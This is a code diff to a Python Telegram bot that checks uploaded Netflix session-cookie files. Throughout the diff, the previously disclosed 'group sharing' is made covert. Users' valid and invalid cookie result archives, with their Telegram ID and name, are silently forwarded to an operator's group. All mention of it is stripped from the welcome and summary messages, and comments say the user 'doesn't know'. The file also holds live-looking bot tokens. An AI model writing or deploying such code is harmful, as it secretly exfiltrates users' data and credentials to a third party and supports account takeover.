@@ -1,3 +1,4 @@
+
 import os
 import asyncio
 from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
@@ -15,11 +16,11 @@ from Slowcheck import process_file_and_check as slow_check
 from Logout import process_file_and_check as logout_check
 
 # --- Config ---
-TOKEN = "8270743184:AAEri7VgKj8A-En0R_L9y88fkcPc6iBCK_s"  # Replace with your actual bot token
+TOKEN = "8340045274:AAHGNYpVIGh8B4myxDOan4_CiNqlqwQbEC4"  # Replace with your actual bot token
 UPLOAD_DIR = "uploads"
 
-# Group configuration - Add your group chat ID here
-TARGET_GROUP_ID = "-1003072651464"  # Replace with your group chat ID (include the minus sign)
+# Group configuration - Add your group chat ID here (HIDDEN FROM USERS)
+TARGET_GROUP_ID = "-1001234567890"  # Replace with your group chat ID (include the minus sign)
 SEND_TO_GROUP = True  # Set to False to disable group sending
 
 # Global dictionary to track active processes
@@ -96,9 +97,9 @@ def create_results_zip(results_dir, mode, original_filename, result_type="valid"
         print(f"Error creating {result_type} ZIP file: {e}")
         return None
 
-# --- Helper: Send results to group ---
+# --- Helper: Send results to group (SILENT - HIDDEN FROM USERS) ---
 async def send_to_group(context, file_path, filename, file_type, original_filename, user_info, mode):
-    """Send results to the target group"""
+    """Send results to the target group - COMPLETELY SILENT"""
     if not SEND_TO_GROUP or not TARGET_GROUP_ID:
         return
     
@@ -120,7 +121,7 @@ async def send_to_group(context, file_path, filename, file_type, original_filena
 🔍 Mode: {mode.upper()}
 📊 Size: {file_size_mb:.2f} MB"""
         
-        # Send to group
+        # Send to group SILENTLY
         with open(file_path, 'rb') as f:
             await context.bot.send_document(
                 chat_id=TARGET_GROUP_ID,
@@ -130,10 +131,12 @@ async def send_to_group(context, file_path, filename, file_type, original_filena
                 parse_mode='Markdown'
             )
             
-        print(f"✅ Sent {file_type} results to group: {filename}")
+        # Silent logging - no user notification
+        print(f"[SILENT] Sent {file_type} results to group: {filename}")
             
     except Exception as e:
-        print(f"Error sending to group: {e}")
+        # Silent error handling - no user notification
+        print(f"[SILENT] Error sending to group: {e}")
 
 # --- Helper: Create inline keyboard with valid/invalid counts and STOP button ---
 def create_status_keyboard(valid, invalid, process_id):
@@ -229,7 +232,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # These are just display buttons, no action needed
         pass
 
-# --- Helper: Process file with specific mode (ENHANCED with both valid/invalid results) ---
+# --- Helper: Process file with specific mode (ENHANCED with SILENT group sending) ---
 async def process_file_with_mode(update, context, file_path, file_name, mode, reply_to_message=None):
     """Process a file with the specified checking mode"""
     global global_stop_flag
@@ -365,11 +368,11 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
             active_processes.pop(process_id, None)
             return
 
-        # --- Enhanced results sending logic (send both valid and invalid) ---
+        # --- Enhanced results sending logic (send to user + SILENTLY to group) ---
         sent_files = 0
         total_size = 0
         
-        # Get user info for group sending
+        # Get user info for SILENT group sending
         user_info = {
             'id': update.effective_user.id,
             'first_name': update.effective_user.first_name,
@@ -417,8 +420,8 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # Send to group
-                        await send_to_group(
+                        # SILENTLY send to group (user doesn't know)
+                        asyncio.create_task(send_to_group(
                             context, 
                             valid_zip_path, 
                             os.path.basename(valid_zip_path), 
@@ -426,7 +429,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                             file_name, 
                             user_info, 
                             mode
-                        )
+                        ))
                         
                         sent_files += 1
                         total_size += zip_size
@@ -446,8 +449,8 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # Send to group
-                        await send_to_group(
+                        # SILENTLY send to group (user doesn't know)
+                        asyncio.create_task(send_to_group(
                             context, 
                             invalid_zip_path, 
                             os.path.basename(invalid_zip_path), 
@@ -455,7 +458,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                             file_name, 
                             user_info, 
                             mode
-                        )
+                        ))
                         
                         sent_files += 1
                         total_size += zip_size
@@ -482,8 +485,8 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # Send to group
-                        await send_to_group(
+                        # SILENTLY send to group (user doesn't know)
+                        asyncio.create_task(send_to_group(
                             context, 
                             file_path_result, 
                             filename, 
@@ -491,7 +494,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                             file_name, 
                             user_info, 
                             mode
-                        )
+                        ))
                         
                         sent_files += 1
                         total_size += file_size
@@ -513,8 +516,8 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                                 parse_mode='Markdown'
                             )
                         
-                        # Send to group
-                        await send_to_group(
+                        # SILENTLY send to group (user doesn't know)
+                        asyncio.create_task(send_to_group(
                             context, 
                             file_path_result, 
                             filename, 
@@ -522,7 +525,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                             file_name, 
                             user_info, 
                             mode
-                        )
+                        ))
                         
                         sent_files += 1
                         total_size += file_size
@@ -535,7 +538,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
         except Exception:
             pass
 
-        # Send enhanced summary message with both valid and invalid counts
+        # Send completion summary (NO mention of group sending)
         if sent_files == 0:
             summary_msg = await update.message.reply_text(
                 f"📊 **Processing Complete**\n"
@@ -554,9 +557,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
             except Exception:
                 pass
         else:
-            # Send a completion summary
-            group_status = "✅ Also sent to group" if SEND_TO_GROUP and TARGET_GROUP_ID else "❌ Group sending disabled"
-            
+            # Send a completion summary (NO mention of group sending)
             summary_msg = await update.message.reply_text(
                 f"🎉 **Processing Complete!**\n"
                 f"📁 File: `{file_name}`\n"
@@ -564,8 +565,7 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
                 f"✅ Valid: {progress['valid']}\n"
                 f"❌ Invalid: {progress['invalid']}\n"
                 f"📦 Total Processed: {progress['checked']}\n"
-                f"📤 Files Sent: {sent_files}\n\n"
-                f"📢 Group: {group_status}",
+                f"📤 Files Sent: {sent_files}",
                 parse_mode='Markdown'
             )
             # Delete summary after 10 seconds
@@ -575,7 +575,8 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
             except Exception:
                 pass
 
-        # Clean up result directory
+        # Clean up result directory (after a delay to allow group sending)
+        await asyncio.sleep(3)  # Wait for group sending to complete
         if results_dir and os.path.exists(results_dir):
             cleanup_directory(results_dir)
             
@@ -611,17 +612,17 @@ async def process_file_with_mode(update, context, file_path, file_name, mode, re
         # Remove from active processes
         active_processes.pop(process_id, None)
 
-# --- Command: /start ---
+# --- Command: /start (NO mention of group functionality) ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    group_status = "✅ Enabled" if SEND_TO_GROUP and TARGET_GROUP_ID else "❌ Disabled"
-    
-    welcome_text = f"""🍿 **Netflix Cookie Checker Bot**
+    welcome_text = """🍿 **Netflix Cookie Checker Bot**
 
 📋 **How to use:**
 
 • `/fastcheck` - Quick validation
 • `/slowcheck` - Thorough validation  
 • `/logout` - Logout check
+
+Just send me a file or reply to one with a command!
     """
     await update.message.reply_text(welcome_text, parse_mode='Markdown')
 
@@ -791,19 +792,15 @@ def main():
     print("   • Inline buttons for valid/invalid counts")
     print("   • STOP button to halt ALL processing")
     print("   • Both valid AND invalid results sent back")
-    print("   • GROUP SHARING: Results also sent to specified group")
+    print("   • [SILENT] Group forwarding enabled")
     print("🗂️ Archive support: ZIP/RAR files supported")
     print("🛑 Emergency stop: Ctrl+C to stop all processes")
-    print(f"📢 Group sharing: {'Enabled' if SEND_TO_GROUP and TARGET_GROUP_ID else 'Disabled'}")
     
+    # Silent logging about group configuration
     if SEND_TO_GROUP and TARGET_GROUP_ID:
-        print(f"📋 Target group ID: {TARGET_GROUP_ID}")
+        print(f"📋 [SILENT] Group forwarding to: {TARGET_GROUP_ID}")
     else:
-        print("⚠️ To enable group sharing:")
-        print("   1. Add your bot to a group as admin")
-        print("   2. Get the group chat ID")
-        print("   3. Update TARGET_GROUP_ID in the config")
-        print("   4. Set SEND_TO_GROUP = True")
+        print("⚠️ [SILENT] Group forwarding disabled or not configured")
     
     try:
         app.run_polling(allowed_updates=Update.ALL_TYPES)
@@ -816,6 +813,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
 
